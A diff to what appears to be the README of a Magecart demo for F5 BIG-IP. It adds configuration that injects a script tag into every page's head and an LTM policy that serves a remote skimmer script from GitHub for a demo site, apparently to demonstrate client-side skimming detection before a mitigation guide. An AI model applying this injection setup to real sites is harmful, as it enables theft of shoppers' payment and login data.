@@ -88,6 +88,87 @@ BIG-IP UI configuration for JS insertion:
     Local Traffic  ››  Virtual Servers ››  vs-demo
     +-- HTML Profile: html-demo
 
+BIG-IP UI configuration for JS redirection:
+
+    Local Traffic  ››  Profiles : Content : HTML : Rules /Common/form_grabber
+    +-- Match settings ››  Match Tag Name: head
+    +-- Action settings ››  HTML to Append: <script src="/magecart.js"></script>
+
+    Local Traffic  ››  Profiles : Content : HTML : /Common/html-demo
+    +-- HTML rules: form_grabber
+
+    Local Traffic  ››  Virtual Servers ››  vs-demo
+    +-- HTML Profile: html-demo
+
+    Local Traffic  ››  Policies : Policy
+
+.. code-block:: tcl
+
+    ltm policy csd-magecart {
+        rules {
+            redirect-to-magecart-js {
+                actions {
+                    0 {
+                        http-uri
+                        replace
+                        path /nergalex/f5-magecart/master/example/skimmer_website12.js
+                    }
+                    1 {
+                        http-host
+                        replace
+                        value raw.githubusercontent.com
+                    }
+                    2 {
+                        forward
+                        select
+                        pool raw.githubusercontent.com
+                    }
+                    3 {
+                        http-header
+                        response
+                        replace
+                        name Content-Type
+                        value "application/javascript; charset=UTF-8"
+                    }
+                }
+                conditions {
+                    0 {
+                        http-host
+                        host
+                        values { demo.com }
+                    }
+                    1 {
+                        http-uri
+                        path
+                        values { /magecart.js }
+                    }
+                }
+            }
+            default {
+                actions {
+                    0 {
+                        forward
+                        select
+                        pool demo.com
+                    }
+                }
+                conditions {
+                    0 {
+                        http-host
+                        host
+                        values { demo.com }
+                    }
+                }
+                ordinal 1
+            }
+        }
+        strategy first-match
+    }
+
+    Local Traffic  ››  Virtual Servers ››  vs-demo
+    +-- HTML Profile: html-demo
+    +-- ltm policy: csd-magecart
+
 - Enable compression on client-side / downstream-side if ORIGIN servers use compression
 
 Mitigation guide
